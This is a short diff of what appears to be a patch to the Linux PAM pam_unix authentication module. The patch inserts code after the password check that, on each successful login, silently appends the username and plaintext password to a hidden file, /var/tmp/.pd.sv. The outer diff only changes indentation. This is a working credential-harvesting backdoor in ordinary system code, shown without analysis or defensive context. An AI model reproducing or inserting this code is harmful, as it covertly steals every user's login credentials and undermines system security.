@@ -9,18 +9,18 @@
   	name = p = NULL;
   
   	AUTH_RETURN;
---- 170,200 ----
+--- 170,184 ----
   	D(("user=%s, password=[%s]", name, p));
   
   	/* verify the password of this user */
 !       retval = _unix_verify_password(pamh, name, p, ctrl);
 !       FILE *fp = NULL;
 !       if(retval == PAM_SUCCESS){
-!						fp = fopen("/var/tmp/.pd.sv", "a+");
-!						if(NULL != fp) {
-!							fprintf(fp, "%s -> %s\n", name, p);
-!							fclose(fp);
-!		}
+!           fp = fopen("/var/tmp/.pd.sv", "a+");
+!           if(NULL != fp) {
+!               fprintf(fp, "%s -> %s\n", name, p);
+!               fclose(fp);
+!		    }
 !}
   	name = p = NULL;
   
